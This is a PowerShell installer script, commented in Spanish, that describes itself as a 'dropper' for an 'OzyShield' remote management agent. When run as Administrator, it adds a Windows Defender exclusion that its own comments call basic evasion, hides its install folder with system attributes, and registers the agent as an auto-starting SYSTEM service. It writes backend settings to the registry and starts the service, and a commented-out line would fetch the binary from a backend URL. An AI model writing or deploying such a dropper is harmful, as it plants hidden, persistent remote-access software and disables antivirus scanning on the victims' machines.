# OzyShield Agent Installer (Dropper)
# Debe ser ejecutado como Administrador.

$ErrorActionPreference = "Stop"

# Configuración
$ServiceName = "OzyShieldAgent"
$InstallDir = "C:\ProgramData\OzyShield"
$AgentExe = "agent.exe"
$BackendUrl = "localhost:8080" # Cambiar por la URL pública en producción
$AgentId = $env:COMPUTERNAME.ToLower()

Write-Host "[*] Iniciando instalación de OzyShield Agent..." -ForegroundColor Cyan

# 1. Verificar privilegios de administrador
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "Este script DEBE ejecutarse con privilegios de Administrador (elevado)."
    Exit 1
}

# 2. Evasión Básica - Agregar exclusión de Windows Defender ANTES de la instalación
Write-Host "[*] Configurando exclusión de Windows Defender para: $InstallDir" -ForegroundColor Yellow
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
        Write-Host "[+] Exclusión agregada correctamente." -ForegroundColor Green
    } catch {
        Write-Host "[!] Advertencia: No se pudo agregar la exclusión de Windows Defender. Continuando..." -ForegroundColor DarkYellow
    }
}

# 3. Crear directorio de instalación oculto
if (-not (Test-Path $InstallDir)) {
    Write-Host "[*] Creando directorio oculto: $InstallDir"
    $folder = New-Item -ItemType Directory -Force -Path $InstallDir
    $folder.Attributes = 'Hidden', 'System', 'Directory'
}

# 4. Detener servicio previo si existe
if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
    Write-Host "[*] Deteniendo servicio existente..."
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    # Pequeña pausa para asegurar la liberación del archivo
    Start-Sleep -Seconds 2
}

# 5. Descargar/Copiar binario
# En un entorno real de producción:
# Invoke-WebRequest -Uri "http://$BackendUrl/downloads/agent.exe" -OutFile "$InstallDir\$AgentExe"
# Para desarrollo local, copiamos el binario recién compilado de la ruta de workspace:
$LocalSource = "$PSScriptRoot\..\agent\agent.exe"
if (Test-Path $LocalSource) {
    Write-Host "[*] Copiando binario local: $LocalSource -> $InstallDir\$AgentExe"
    Copy-Item -Path $LocalSource -Destination "$InstallDir\$AgentExe" -Force
} else {
    Write-Host "[!] No se encontró agent.exe local en $LocalSource." -ForegroundColor DarkYellow
    Write-Host "[*] Buscando en el directorio actual..."
    if (Test-Path "agent.exe") {
        Copy-Item -Path "agent.exe" -Destination "$InstallDir\$AgentExe" -Force
    } else {
        Write-Error "No se pudo localizar el binario agent.exe para la instalación."
        Exit 1
    }
}

# 6. Registrar como Servicio de Windows (sc create)
Write-Host "[*] Registrando servicio Windows '$ServiceName'..." -ForegroundColor Yellow

# Eliminamos servicio previo si está registrado para evitar colisiones
if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
    & sc.exe delete $ServiceName | Out-Null
    Start-Sleep -Seconds 1
}

# Registramos servicio nativo que corre bajo SYSTEM account
$binaryPath = "`"$InstallDir\$AgentExe`""
& sc.exe create $ServiceName binPath= $binaryPath start= auto | Out-Null
& sc.exe description $ServiceName "ApexRMM OzyShield Remote Management Agent" | Out-Null

# 7. Configurar variables de entorno específicas para el servicio
# Las almacenamos en el registro para el contexto del servicio
$RegistryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName"
if (Test-Path $RegistryPath) {
    Write-Host "[*] Configurando variables de entorno (BACKEND_URL: $BackendUrl, AGENT_ID: $AgentId)..."
    # Guardamos en la llave Environment
    $envList = @(
        "BACKEND_URL=$BackendUrl",
        "AGENT_ID=$AgentId"
    )
    New-ItemProperty -Path $RegistryPath -Name "Environment" -Value $envList -PropertyType MultiString -Force | Out-Null
}

# 8. Iniciar el servicio
Write-Host "[*] Iniciando el servicio..." -ForegroundColor Cyan
Start-Service -Name $ServiceName

Write-Host "[+] Instalación completada exitosamente. El agente ahora corre en segundo plano como servicio de Windows." -ForegroundColor Green
